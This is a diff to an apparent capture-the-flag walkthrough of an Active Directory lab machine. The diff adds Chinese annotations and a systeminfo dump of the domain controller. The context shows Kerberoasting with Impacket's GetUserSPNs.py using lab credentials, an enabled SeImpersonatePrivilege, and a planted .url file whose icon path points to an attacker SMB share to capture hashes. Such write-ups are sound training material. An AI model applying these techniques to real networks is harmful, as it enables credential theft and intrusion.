@@ -235,7 +235,7 @@ There may be a short delay until the server is ready.
 /home/syareya55
 [~][★]$ cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .
 ```
-#### 这里啊，可以看到MSSQLSvc/breachdc.breach.vl:1433,ServicePrincipalName=SPN
+#### 这里啊，可以看到MSSQLSvc/breachdc.breach.vl:1433,ServicePrincipalName=SPN 服务主体名称
 ```
 [★]$ GetUserSPNs.py 'breach.vl/julia.wong:Computer1' -request 
 Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
@@ -424,7 +424,7 @@ SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
 SeMachineAccountPrivilege     Add workstations to domain                Disabled
 SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
 SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled  //允许进程模拟另一个用户的安全上下文
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 PS C:\Windows\system32>
@@ -512,4 +512,52 @@ URL=asdasdas
 WorkingDirectory=hehe
 IconFile=\\10.10.14.27\aasd\nc.ico
 IconIndex=1
+
+PS C:\share\transfer> systeminfo
+
+Host Name:                 BREACHDC
+OS Name:                   Microsoft Windows Server 2022 Datacenter
+OS Version:                10.0.20348 N/A Build 20348		//Windows Server 2022 (Build 20348)
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          EC2
+Registered Organization:   Amazon.com
+Product ID:                00454-70295-72962-AA769
+Original Install Date:     2/10/2022, 9:11:02 AM
+System Boot Time:          3/8/2026, 2:13:10 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC) Coordinated Universal Time
+Total Physical Memory:     4,095 MB
+Available Physical Memory: 2,332 MB
+Virtual Memory: Max Size:  6,271 MB
+Virtual Memory: Available: 4,472 MB
+Virtual Memory: In Use:    1,799 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    breach.vl
+Logon Server:              N/A			//没有额外的 Service Pack；新系统通常显示 N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.10.2
+                                 IP address(es)
+                                 [01]: 10.129.3.36
+                                 [02]: fe80::5d2e:5196:1a25:ace4
+                                 [03]: dead:beef::5d2e:5196:1a25:ace4
+                                 [04]: dead:beef::24d
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+PS C:\share\transfer> 
 ```
